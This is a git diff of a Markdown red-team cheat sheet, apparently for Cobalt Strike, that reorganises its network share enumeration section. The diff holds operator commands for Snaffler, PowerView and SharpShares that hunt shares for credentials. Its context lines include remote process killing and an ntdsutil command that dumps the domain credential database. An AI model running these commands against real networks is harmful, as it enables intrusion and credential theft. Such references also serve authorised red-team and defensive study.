@@ -9,7 +9,6 @@
 - [Defense Evasion](#defense-evasion)
 - [Exploitation](#exploitation)
 - [Exfiltration - Password Attacks](#exfiltration---password-attacks)
-- [Network Share Enumeration](#network-share-enumeration)
 - [Persistence](#persistence)
 - [Cobalt Strike BOFs](#cobalt-strike-bofs)
 - [References](#references)
@@ -63,12 +62,6 @@ powershell-import --> ADRecon.ps1
 powershell ADRecon -OutputDir .\ -DomainController ops-dc.lab.com
 ```
 
-**Domain SMB Shares Enumeration**<br>
-[SharpShares](https://github.com/mitchmoser/SharpShares) - List accessible shares on remote systems and check read/write privileges<br>
-```
-execute-assembly SharpShares.exe /ldap:all /filter:sysvol,netlogon,ipc$,print$
-```
-
 Get domain trusts and domain controllers with built-in `nltest.exe` utility
 ```
 # Get all domain controllers of a domain
@@ -77,7 +70,36 @@ run nltest /dclist:domain.com
 run nltest /trusted_domains
 ```
 
-## Miscellaneous Remote Workstation/Server stuff
+### Domain SMB Share Enumeration <br>
+[PowerView](https://powersploit.readthedocs.io/en/latest)
+```
+powershell-import --> Select PowerView.ps1 to import PS1 file in memory
+# Find all domain shares that the current user has access to 
+powershell Find-DomainShare -CheckShareAccess
+
+# Find interesting domain share files
+powershell Find-InterestingDomainShareFile -ComputerDomain DOMAIN.COM
+```
+
+[SharpShares](https://github.com/mitchmoser/SharpShares) - List accessible shares on remote systems and check read/write privileges<br>
+```
+# Find all accessible network shares in a domain, exclude default share names (SYSVOL,netlogon,ipc$,print$), and perform read/write access checks
+execute-assembly C:\SharpShares.exe /ldap:all /filter
+
+# Find all server shares (including DCs), exclude default share names, perform read/write access checks and output to file
+execute-assembly C:\SharpShares.exe /ldap:servers /filter /outfile:find-domain-shares.txt
+```
+
+[Snaffler](https://github.com/SnaffCon/Snaffler) - Automated network share enumeration to look for interesting files/creds
+```
+# Run Snaffler on all domain systems found, output to console and file
+execute-assembly C:\snaffler.exe -d DOMAN.COM -s -o C:\temp\snaffler.log
+
+# Run Snaffler on only target hosts
+execute-assembly C:\snaffler.exe -s -o C:\temp\snaffler2.log -n hostname1.domain.com,hostname2.domain.com,hostname3.domain.com
+```
+
+### Miscellaneous Remote Workstation/Server stuff
 
 List and kill processes on remote system (requires local Admin)
 - Using tasklist.exe and taskkill.exe <br />
@@ -90,7 +112,6 @@ run taskkill /s SERVER.domain.com /IM PROCESS.exe --> Kill remote process
 execute-assembly CIMplant.exe -s [remote-IP-address] -c ps --> List remote processes
 execute-assembly CIMplant.exe -s [remote-IP-address] -c process_kill <ProcessName/PID> --> Kill remote process
 ```
-
 -----------------------------------------------------------------------------------------
 ## Local Privilege Escalation
 
@@ -530,35 +551,6 @@ powerpick Copy-VSS -DestinationDir C:\temp
 NTDSutil.exe to dump NTDS.dit locally on a Domain Controller
 ```
 run ntdsutil.exe activate instance ntds,ifm,create full C:\ntdsutil,quit,quit | ntdsutil
-```
-------------------------------------------------------------------------------------------
-## Network Share Enumeration
-[Snaffler](https://github.com/SnaffCon/Snaffler) - Automated network share enumeration to look for interesting files/creds
-```
-# Run Snaffler on all domain systems found, output to console and file
-execute-assembly C:\snaffler.exe -d DOMAN.COM -s -o C:\temp\snaffler.log
-
-# Run Snaffler on only target hosts
-execute-assembly C:\snaffler.exe -s -o C:\temp\snaffler2.log -n hostname1.domain.com,hostname2.domain.com,hostname3.domain.com
-```
-
-[PowerView](https://powersploit.readthedocs.io/en/latest)
-```
-powershell-import --> Select PowerView.ps1 to import PS1 file in memory
-# Find all domain shares that the current user has access to 
-powershell Find-DomainShare -CheckShareAccess
-
-# Find interesting domain share files
-powershell Find-InterestingDomainShareFile -ComputerDomain DOMAIN.COM
-```
-
-[SharpShares](https://github.com/mitchmoser/SharpShares)
-```
-# Find all accessible network shares in a domain, exclude default share names (SYSVOL,netlogon,ipc$,print$), and perform read/write access checks
-execute-assembly C:\SharpShares.exe /ldap:all /filter
-
-# Find all server shares (including DCs), exclude default share names, perform read/write access checks and output to file
-execute-assembly C:\SharpShares.exe /ldap:servers /filter /outfile:find-domain-shares.txt
 ```
 ------------------------------------------------------------------------------------------
 ## Persistence
